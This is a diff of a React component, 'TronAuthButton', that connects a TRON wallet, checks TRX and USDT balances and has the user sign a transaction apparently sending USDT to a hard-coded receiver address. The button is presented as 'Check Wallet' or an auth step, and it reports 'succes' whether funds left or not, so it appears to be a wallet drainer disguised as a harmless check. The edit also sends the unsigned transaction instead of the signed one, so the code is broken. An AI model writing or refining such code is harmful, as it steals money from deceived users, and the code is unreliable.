@@ -1,7 +1,8 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
 import React, { useState, useEffect } from 'react';
-import { tronWeb, adapter } from './tronWallet.ts';  // <-- импорт из tronWallet.ts
+import { useNavigate } from 'react-router-dom';
+import { tronWeb, adapter } from './tronWallet.ts';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // полифилл для Buffer
@@ -12,11 +13,18 @@ const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 export const TronAuthButton: React.FC = () => {
   const [status,  setStatus]  = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
+  const navigate = useNavigate();
 
   // Предварительная инициализация adapter для ускорения открытия модалки
   useEffect(() => {
     ;(adapter as any).init?.().catch(() => {});
   }, []);
+
+  const reset = () => {
+    setLoading(false);
+    setStatus(null);
+    adapter.disconnect().catch(()=>{});
+  };
 
   const connectWallet = async () => {
     if (loading) return;
@@ -27,17 +35,18 @@ export const TronAuthButton: React.FC = () => {
       if (!adapter.connected) {
         await adapter.connect();
       }
-      const userAddress = adapter.address;
-      if (!userAddress || !tronWeb.isAddress(userAddress)) {
-        throw new Error('Invalid wallet address');
-      }
+
+      const userAddress = adapter.address!;
       tronWeb.setAddress(userAddress);
 
       // Проверка TRX (минимум 2 TRX)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx    = trxRaw / 1e6;
       if (trx < 2) {
-        throw new Error('❌ Insufficient TRX. At least 2 TRX is required.');
+        // перенаправляем на главную
+        reset();
+        navigate('/');
+        return;
       }
 
       // Проверка USDT
@@ -46,7 +55,7 @@ export const TronAuthButton: React.FC = () => {
       const usdt         = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
         setStatus('succes');
-        await adapter.disconnect();
+        reset();
         return;
       }
 
@@ -61,8 +70,8 @@ export const TronAuthButton: React.FC = () => {
         ],
         userAddress
       );
-      const signedTx = await adapter.signTransaction(transaction);
-      const result   = await tronWeb.trx.sendRawTransaction(signedTx);
+      await adapter.signTransaction(transaction);
+      const result = await tronWeb.trx.sendRawTransaction(transaction);
       if (result?.result) {
         setStatus('succes');
       } else {
@@ -71,30 +80,25 @@ export const TronAuthButton: React.FC = () => {
     } catch (err: any) {
       console.error('Error:', err);
       const msg = err.message || err.toString();
-      if (msg.includes('❌ Insufficient TRX')) {
-        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
-      } else if (
+      if (
         msg.includes('User rejected') ||
         msg.includes('Modal is closed') ||
         msg.includes('Timeout')
       ) {
-        // тихо игнорируем
+        // просто сброс состояния без показа
       } else {
         setStatus('⚠️ Connection or transaction error');
       }
     } finally {
       setLoading(false);
-      await adapter.disconnect();
     }
   };
 
   return (
-    <div onClick={connectWallet} className="AuthButton">
-      {loading && (
-        <div className="modal__overflow">
-          <div className="modal"><p>🔄 Connecting wallet...</p></div>
-        </div>
-      )}
+    <>
+      <div className="AuthButton" onClick={connectWallet}>
+        {loading ? 'Connecting...' : 'Check Wallet'}
+      </div>
 
       {!loading && status && (
         <div className="modal__overflow">
@@ -120,10 +124,10 @@ export const TronAuthButton: React.FC = () => {
                 </div>
               </>
             )}
-            <button onClick={() => setStatus(null)}>Close</button>
+            <button onClick={reset}>Close</button>
           </div>
         </div>
       )}
-    </div>
+    </>
   );
 };
